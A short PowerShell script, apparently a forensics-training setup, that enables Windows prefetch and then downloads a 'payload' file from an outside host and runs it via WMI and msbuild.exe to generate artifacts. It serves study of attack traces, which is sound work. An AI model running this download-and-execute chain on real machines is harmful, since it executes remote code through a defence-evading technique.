## MSBuild setup

# 0. If server disable prefetch so we generate prefetch artifacts
if ( $(Get-CimInstance -Class CIM_OperatingSystem).Caption -like "*Server*" ) {
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 3 /f
    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Prefetcher" /v MaxPrefetchFiles /t REG_DWORD /d 8192 /f
    Enable-MMAgent –OperationAPI -ErrorAction SilentlyContinue
    Start-Service Sysmain -ErrorAction SilentlyContinue
}

# 1. Download payload
$Url = "https://present.velocidex.com/resources/kUgJI.TMP"
$dest = "\\127.0.0.1\C$\Windows\Temp\kUgJI.TMP"

Remove-Item -Path $dest -force -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri $Url -OutFile $dest -UseBasicParsing

# 2. Execute payload
Invoke-WmiMethod -ComputerName 127.0.0.1 -Name Create -Class Win32_PROCESS "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe C:\Windows\Temp\kUgJI.TMP /noconsolelogger"
